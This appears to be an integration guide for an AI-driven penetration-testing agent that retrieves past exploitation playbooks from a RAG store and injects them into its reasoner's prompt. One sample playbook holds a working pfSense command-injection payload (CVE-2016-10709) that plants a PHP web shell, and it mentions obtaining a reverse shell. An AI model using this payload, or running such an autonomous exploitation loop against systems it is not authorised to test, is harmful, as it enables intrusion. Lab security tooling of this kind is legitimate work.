# RAG Memory Integration Guide

**Date:** 2026-02-06
**Version:** 1.3+
**Feature:** RAG Memory System with Playbooks + Anti-Patterns

---

## Overview

The MVP Pentest Agent now integrates with the RAG Memory System to query:
1. **Security Playbooks** (successful exploitation techniques)
2. **Anti-Patterns** (failed exploits with alternatives)

This enhancement provides the REASONER with historical knowledge from past penetration tests, improving decision-making accuracy and reducing repeated mistakes.

---

## Architecture Integration

### **Intelligence Flow (Enhanced)**

```
Target Discovery
    ↓
Port/Service Scanning (Nmap)
    ↓
Service Enrichment (Data Cleaner)
    ↓
┌──────────────────────────────────────────────────┐
│          INTELLIGENCE LAYER (Parallel)           │
├──────────────────────────────────────────────────┤
│                                                  │
│  ┌─────────────┐        ┌──────────────────┐   │
│  │  PROFILER   │        │  VULN LOOKUP     │   │
│  │  (Haiku 3.5)│        │  (SearchSploit)  │   │
│  └──────┬──────┘        └────────┬─────────┘   │
│         │                        │              │
│         ▼                        ▼              │
│    Target Profile           CVE Data            │
│    (OS, Tech Stack)         (Exploits)          │
│                                                  │
└──────────────────────────────────────────────────┘
    ↓
┌──────────────────────────────────────────────────┐
│           RAG MEMORY SYSTEM                      │
├──────────────────────────────────────────────────┤
│                                                  │
│  Collection: security_playbooks                  │
│                                                  │
│  Query 1: Type = "playbook"                     │
│  → Successful techniques                         │
│  → Payloads and strategies                       │
│                                                  │
│  Query 2: Type = "anti_pattern"                 │
│  → Failed exploits                               │
│  → Reasons for failure                           │
│  → Successful alternatives                       │
│                                                  │
└──────────────────────────────────────────────────┘
    ↓
┌──────────────────────────────────────────────────┐
│          REASONER (Sonnet 4)                     │
├──────────────────────────────────────────────────┤
│                                                  │
│  System Prompt Enhanced With:                    │
│  1. Target Profile (Profiler)                    │
│  2. Vulnerabilities (VulnLookup)                 │
│  3. Playbooks (RAG Memory)                       │
│  4. Anti-Patterns (RAG Memory)                   │
│                                                  │
│  → Tactical Planning with Full Context           │
│                                                  │
└──────────────────────────────────────────────────┘
```

---

## Implementation Details

### **1. New Agent: RAGMemoryAgent**

**File:** `src/agent/definitions/rag-memory-agent.ts`

**Responsibilities:**
- Query `security_playbooks` collection via MCP
- Filter by type: `playbook` vs `anti_pattern`
- Format results for Reasoner injection

**Key Methods:**
```typescript
// Query RAG memory with intelligence context
async queryMemory(context: {
  services?: string[];   // ["pfsense", "apache", "lighttpd"]
  cves?: string[];       // ["CVE-2016-10709"]
  profile?: string;      // "Linux LAMP stack"
}, topK: number): Promise<RAGMemoryResult>

// Separate queries for each type
private async queryPlaybooks(queryText, topK): Promise<RAGMemoryDocument[]>
private async queryAntiPatterns(queryText, topK): Promise<RAGMemoryDocument[]>

// Format for Reasoner injection
private formatForInjection(playbooks, antiPatterns): string
```

---

### **2. Orchestrator Integration**

**File:** `src/agent/index.ts`

**Changes:**

#### **A. Initialization**
```typescript
// Constructor
if (config.enableRAGMemory && config.mcpServers.rag_memory) {
  this.ragMemory = new RAGMemoryAgent(this.mcpAgent);
}
```

#### **B. Intelligence Layer Execution**
```typescript
// After Profiler + VulnLookup complete...

if (this.ragMemory) {
  // Extract context from Intelligence Layer
  const services = allDiscoveredServices.map(s => s.product || s.service);
  const cves = vulnerabilities.map(v => v.cve_id);
  const profile = targetProfile?.os_family + ' ' + targetProfile?.tech_stack.join(' ');

  // Query RAG memory
  const ragResult = await this.ragMemory.queryMemory({
    services,
    cves,
    profile
  }, 3);

  // Inject into Reasoner
  if (ragResult.playbooks.length > 0 || ragResult.antiPatterns.length > 0) {
    this.reasoner.injectMemoryContext(ragResult.formattedText);
  }
}
```

---

## RAG Memory Query Examples

### **Query Construction**

**Input (Intelligence Context):**
```typescript
{
  services: ["pfsense", "lighttpd"],
  cves: ["CVE-2016-10709", "CVE-2014-2323"],
  profile: "Linux firewall LAMP stack"
}
```

**Constructed Query:**
```
services: pfsense, lighttpd | vulnerabilities: CVE-2016-10709, CVE-2014-2323 | target: Linux firewall LAMP stack
```

**MCP Tool Calls:**
1. `rag_query_playbooks` with `type=playbook`
2. `rag_query_playbooks` with `type=anti_pattern`

---

### **Example Results**

#### **Playbook (Successful Technique)**
```markdown
✅ **Strategy for pfsense**

**Vulnerability:** RCE (CVE-2016-10709)
**Difficulty:** medium

**Insight:**
Public exploit 39709 is unreliable due to bad character handling.
Rather than using octals, Base64-encode PHP for reliable exploitation.

**Solution:**
1. Log in as authenticated user
2. Browse to Status > RRD Graphs
3. Intercept request to status_rrd_graph_img.php
4. Inject Base64-encoded PHP payload in database parameter

**Payload Snippet:**
```
/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"%3C%3Fphp+eval%28base64_decode%28%27ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg%27%29%29%3B%3F%3E">writeup.php
```

**Metadata:**
- Service: pfsense
- Port: 443
- CVE: CVE-2016-10709
- Tags: rce, authenticated, php_injection, base64
```

#### **Anti-Pattern (Failed Exploit)**
```markdown
⚠️ **Warning: Exploit-DB 39709**

**Target:** pfsense

**Failure Reason:**
Proof of concept is not stable on this machine. The exploit uses octals
which are not properly handled due to strict filtering.

**Successful Alternative:**
Base64-encode some PHP to obtain a reverse shell. Note that many URL
encoding tools do not encode parenthesis and ampersands, which is
required for this exploit to work.

**Lesson Learned:**
Public exploit 39709 is unreliable. Base64-encode some PHP to obtain
a reverse shell.

**Metadata:**
- Service: pfsense
- Port: 443
- CVE: CVE-2016-10709
- Tags: public_exploit_failure, manual_required
```

---

## Reasoner Context Injection

### **Final System Prompt Enhancement**

The Reasoner receives the following context blocks:

```
[SYSTEM PROMPT - EXISTING]
You are a strategic penetration testing reasoner...
...

[INTELLIGENCE CONTEXT - FROM PROFILER]
Target Profile:
- OS: Linux (Ubuntu 20.04)
- Tech Stack: LAMP (Apache, MySQL, PHP)
- Security Posture: standard
- Risk Level: medium

[VULNERABILITY DATA - FROM VULN LOOKUP]
Known Vulnerabilities:
- CVE-2016-10709 (critical): pfSense RCE
- CVE-2014-2323 (high): lighttpd Path Traversal

[MEMORY RECALL - WARNINGS FROM PAST EXPERIENCE]
The following warnings are based on past penetration testing failures.
Follow these guidelines to avoid repeating past mistakes.

[ANTI-PATTERN WARNING 1/1]
⚠️ **Warning: Exploit-DB 39709**
Target: pfsense
Failure Reason: Proof of concept is not stable...
Successful Alternative: Base64-encode some PHP...
...

[END MEMORY RECALL]

[KNOWN STRATEGIES - SIMILAR SCENARIOS]
The following strategies were successfully used in similar scenarios.
Consider adapting these approaches for the current target.

[STRATEGY 1/1]
✅ **Strategy for pfsense**
Vulnerability: RCE (CVE-2016-10709)
Insight: Public exploit 39709 is unreliable...
Solution: 1. Log in as authenticated user...
...

[END KNOWN STRATEGIES]

[YOUR TASK]
Based on all context above, decide the next strategic action...
```

---

## Configuration

### **Environment Variables**

```bash
# Enable RAG Memory
ENABLE_RAG_MEMORY=true

# RAG Memory MCP Server Path
RAG_MEMORY_SERVER_PATH=/path/to/pentest-rag-memory/dist/server/index.js

# ChromaDB Configuration (in RAG server)
CHROMADB_URL=http://localhost:8000
```

### **MCP Server Configuration**

In `src/index.ts`:
```typescript
const config = {
  // ...
  mcpServers: {
    nmap: { path: nmapPath },
    searchsploit: { path: searchsploitPath },
    rag_memory: { path: ragMemoryPath }, // ✅ Added
  },
  enableRAGMemory: process.env.ENABLE_RAG_MEMORY === 'true',
};
```

---

## RAG Memory MCP Server Setup

### **1. Clone and Build RAG Server**

```bash
cd ..
git clone <pentest-rag-memory-repo>
cd pentest-rag-memory

# Install dependencies
npm install

# Start ChromaDB
docker-compose up -d

# Build TypeScript
npm run build

# Seed initial data (optional)
npm run seed
```

### **2. Process Pentest Reports**

```bash
# Convert PDF to Markdown
python pdf/parse_pdf.py pdf/Sense.pdf

# Extract playbooks and anti-patterns
npm run etl:pdf pdf/Sense.md
```

### **3. Start MCP Server**

```bash
# Start the RAG Memory MCP server
npm start
```

### **4. Verify Integration**

```bash
cd ../mvp
npm start

# Run reconnaissance
> recon 10.129.10.185

# Look for these log messages:
[RAG Memory] Querying past experiences...
[RAG Memory] ✓ Found 2 playbooks, 3 anti-patterns
[RAG Memory] ✓ Context injected into Reasoner
```

---

## Testing

### **Test 1: Basic Query**

**Scenario:** Target with pfsense firewall

**Expected:**
- Query constructs with service="pfsense"
- Retrieves playbooks for pfsense exploitation
- Retrieves anti-patterns for Exploit-DB 39709
- Reasoner receives formatted context

### **Test 2: CVE Matching**

**Scenario:** VulnLookup finds CVE-2016-10709

**Expected:**
- Query includes CVE in context
- RAG returns relevant playbooks tagged with CVE
- Anti-patterns for failed public exploits

### **Test 3: Fallback**

**Scenario:** RAG server unavailable

**Expected:**
- System logs warning
- Continues without RAG context
- Intelligence Layer data still injected

---

## Console Output Example

```
[Orchestrator] === Iteration 3 ===

[Intelligence Layer] Starting parallel analysis...
[Profiler] ✓ Profile: Linux - standard
[VulnLookup] ✓ Found 2 vulnerabilities
  - CVE-2016-10709 (critical)
  - CVE-2014-2323 (high)
[Intelligence Layer] ✓ Intelligence context injected into Reasoner

[RAG Memory] Querying past experiences...
[RAG Memory] Query: services: pfsense, lighttpd | vulnerabilities: CVE-2016-10709 | target: Linux
[RAG Memory] ✓ Found 1 playbooks, 2 anti-patterns
[RAG Memory] ✓ Context injected into Reasoner

[Reasoner] Analyzing situation...
[Reasoner] Thought: Based on the anti-pattern warnings, Exploit-DB 39709 is unreliable. I should use the Base64-encoded PHP approach instead...
[Reasoner] Action: Execute manual exploitation using Base64-encoded PHP payload

[Tactical Plan] ═══════════════════════════════════════════════════
[Tactical Plan] Plan ID: plan_1770376244770_abc123xyz
[Tactical Plan] Target: 10.129.10.185
[Tactical Plan] Attack Vectors: 1
...
```

---

## Benefits

### **1. Avoid Repeated Mistakes**
- Warns about unreliable public exploits
- Suggests proven alternatives
- Reduces wasted reconnaissance time

### **2. Leverage Past Successes**
- Provides working payloads
- Shows successful attack paths
- Accelerates exploitation

### **3. Intelligence-Driven Decisions**
- Combines Profiler, VulnLookup, and RAG Memory
- Reasoner has complete context
- More accurate tactical planning

### **4. Continuous Learning**
- New pentest reports feed RAG system
- Session logs become anti-patterns
- System improves over time

---

## Troubleshooting

### **RAG Memory Not Querying**

**Symptom:** No `[RAG Memory]` log messages

**Causes:**
1. `ENABLE_RAG_MEMORY=false` or not set
2. `RAG_MEMORY_SERVER_PATH` not configured
3. RAG MCP server not running

**Fix:**
```bash
# Check environment
echo $ENABLE_RAG_MEMORY
echo $RAG_MEMORY_SERVER_PATH

# Update .env
ENABLE_RAG_MEMORY=true
RAG_MEMORY_SERVER_PATH=/path/to/pentest-rag-memory/dist/server/index.js

# Restart agent
npm start
```

### **Empty Results**

**Symptom:** `[RAG Memory] No relevant memories found`

**Causes:**
1. ChromaDB collection is empty
2. Query doesn't match any documents
3. Services/CVEs don't exist in database

**Fix:**
```bash
# Check collection stats
cd ../pentest-rag-memory
node dist/scripts/test-playbook-query.js

# Process more reports
npm run etl:pdf pdf/AnotherReport.md
```

### **MCP Connection Failed**

**Symptom:** `[RAG Memory] ⚠ Failed (continuing without memory)`

**Causes:**
1. RAG server not running
2. Wrong server path
3. ChromaDB not accessible

**Fix:**
```bash
# Start RAG server
cd ../pentest-rag-memory
npm start

# Check ChromaDB
docker-compose ps
docker-compose logs chromadb
```

---

## Future Enhancements

1. **Real-time Feedback Loop**
   - Save successful attacks as playbooks automatically
   - Learn from failed attempts in real-time

2. **Confidence Scoring**
   - Weight RAG results by relevance score
   - Prioritize high-confidence playbooks

3. **Multi-Query Strategies**
   - Query by service category (web, database, etc.)
   - Query by attack type (RCE, SQLi, XSS)

4. **RAG Memory Analytics**
   - Track which playbooks are most effective
   - Identify frequently failing exploit patterns

---

**Last Updated:** 2026-02-06
**Integration Status:** ✅ Complete
**Build Status:** ✅ Successful
**Testing Status:** ⏳ Ready for end-to-end testing
